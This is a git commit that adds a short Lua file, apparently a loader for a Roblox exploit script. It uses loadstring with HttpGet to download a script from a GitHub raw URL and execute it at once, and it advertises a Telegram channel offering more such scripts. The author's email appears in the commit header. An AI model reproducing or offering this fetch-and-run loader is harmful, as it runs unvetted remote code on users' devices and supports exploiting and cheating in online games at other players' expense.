7a33c4d1d9a64ca23a1a84fe442a65bc2db2f5df
c00lkidhub <artemm228906@gmail.com>
2026-04-17 21:00:49 +0300

    Add script loader for qwerty14.lua

---
+++ code.lua
@@ -0,0 +1,5 @@
+---r15 only
+loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/qwertys/refs/heads/main/qwerty14.lua"))()
+--more scripts: t.me/arceusxcommunity
+
+ResetOnSpawn = false
